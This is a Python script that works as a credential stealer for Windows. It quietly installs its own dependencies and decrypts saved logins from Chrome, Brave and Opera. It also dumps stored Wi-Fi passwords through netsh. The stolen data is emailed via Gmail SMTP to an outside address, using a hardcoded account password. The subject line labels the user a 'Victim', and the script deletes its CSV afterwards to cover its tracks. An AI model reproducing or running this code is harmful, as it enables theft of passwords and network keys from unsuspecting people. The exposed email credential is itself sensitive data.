#!/usr/bin/enc python3 

import os
import re
import subprocess
import sys
import json
import base64
import sqlite3
import shutil
import csv
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import threading

subject = path =  ""
passwords = []

def send_email(subject, body, attachment_path):
        msg = MIMEMultipart()
        msg['Subject'] = subject
        msg['From'] = "iamqwertyfish@gmail.com"
        msg['To'] = "sepiolsam2023@gmail.com"
        
        msg.attach(MIMEText(body, "plain"))

        filename = attachment_path
        part = MIMEBase("application", "octet-stream")
        with open(filename, "rb") as attachment:
            part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", f"attachment; filename= {os.path.basename(filename)}")

        msg.attach(part)

        try:
            with smtplib.SMTP('smtp.gmail.com', 587) as server:
                server.starttls()
                server.login("iamqwertyfish@gmail.com", 'dfon qiqn lmll bdbr')
                server.send_message(msg)
        except :
            pass

def _BROWSER_():
    def install(package):
        subprocess.check_call([sys.executable , '-m' , 'pip','install',package] ,stdout=subprocess.DEVNULL , stderr=subprocess.DEVNULL)

    try:
        import win32crypt
    except ImportError:
        install('pypiwin32')
        import win32crypt

    try:
        from Cryptodome.Cipher import AES
    except ImportError:
        install('pycryptodomex')
        from Cryptodome.Cipher import AES

    Browser_list = [
        os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE'])) , os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE'])) ,
        os.path.normpath(r"%s\AppData\Local\Brave\Brave-Browser\User Data\Local State"%(os.environ['USERPROFILE'])) , os.path.normpath(r"%s\AppData\Local\Brave\Brave-Browser\User Data"%(os.environ['USERPROFILE'])) ,
        os.path.normpath(r"%s\AppData\Roaming\Opera Software\Opera Stable\Local State"%(os.environ['USERPROFILE'])) , os.path.normpath(r"%s\AppData\Roaming\Opera Software\Opera Stable"%(os.environ['USERPROFILE'])) 
    ]

    for browser in range(0,len(Browser_list),2):
        if os.path.exists(Browser_list[browser]) == True :
            LOCAL_STATE = Browser_list[browser]
            PATH = Browser_list[browser+1]
            used_browser = PATH.split("\\")[5]
            break
    else:
        pass

    def get_secret_key():
        try:
            with open( LOCAL_STATE, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            secret_key = secret_key[5:] 
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            return None
        
    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(ciphertext, secret_key):
        try:
            initialisation_vector = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            cipher = generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = decrypt_payload(cipher, encrypted_password)
            decrypted_pass = decrypted_pass.decode()  
            return decrypted_pass
        except Exception as e:
            return ""
        
    def get_db_connection(chrome_path_login_db):
        try:
            shutil.copy2(chrome_path_login_db, "Loginvault.db") 
            return sqlite3.connect("Loginvault.db")
        except Exception as e:
            return None

    def main():
        try:
            with open(os.path.join(os.getenv("TEMP") , "decrypted_password.csv"), mode='w', newline='', encoding='utf-8') as decrypt_password_file:
                csv_writer = csv.writer(decrypt_password_file, delimiter=',')
                csv_writer.writerow(["index","url","username","password"])
                secret_key = get_secret_key()
                folders = [element for element in os.listdir(PATH) if re.search("^Profile*|^Default$",element)!=None]
                for folder in folders:
                    chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(PATH,folder))
                    conn = get_db_connection(chrome_path_login_db)
                    if(secret_key and conn):
                        cursor = conn.cursor()
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        for index,login in enumerate(cursor.fetchall()):
                            url = login[0]
                            username = login[1]
                            ciphertext = login[2]
                            if(url!="" and username!="" and ciphertext!=""):
                                decrypted_password = decrypt_password(ciphertext, secret_key)
                                csv_writer.writerow([index,url,username,decrypted_password])
                        cursor.close()
                        conn.close()
                        os.remove("Loginvault.db")
        except :
            pass
        finally:
            global path 
            global subject
            subject = f"Victim >> {os.getlogin()} using {used_browser}"
            path = os.path.join(os.getenv('TEMP') , "decrypted_password.csv")

    main()


def _WIFI_():

    def PASSWORD(SSID):
        try:
            wifi = subprocess.check_output(['netsh', 'wlan', 'show', 'profile' , SSID , "key=clear"], text=False)
        except :
            pass
        pattern2 = re.compile(r"   Key Content            : [A-Za-z0-9.!@#$%_&*()-:\"\'+]+")
        matches = pattern2.finditer(wifi.decode())
        global passwords
        for match in matches :
            passwords.append(f"SSID : {SSID} , Password : {match[0][28:]}")
            
    def SSID():
        try:
            output = subprocess.check_output("netsh wlan show profiles".split(), text=False)
        except :
            exit()
                
        pattern = re.compile(r": [A-Za-z0-9.!@#$%_&*()-:\"\' +]+")
        matches = pattern.finditer(output.decode())
        wifi_SSID , threads = [] , []
        for match in matches:
            wifi_SSID.append(match[0][2:])

        for SSID in wifi_SSID :
            t = threading.Thread(target=PASSWORD , args=(SSID,))
            t.start()
            threads.append(t)

        for thread in threads:
            thread.join()
            
    SSID()


if __name__ == "__main__":
    try:
        _BROWSER_()
        _WIFI_()
        body = "\n".join(passwords) if passwords else "No passwords were Found !"
        send_email(subject=subject , body=body , attachment_path=path)
    except:
        pass
    finally:
        os.remove(path)
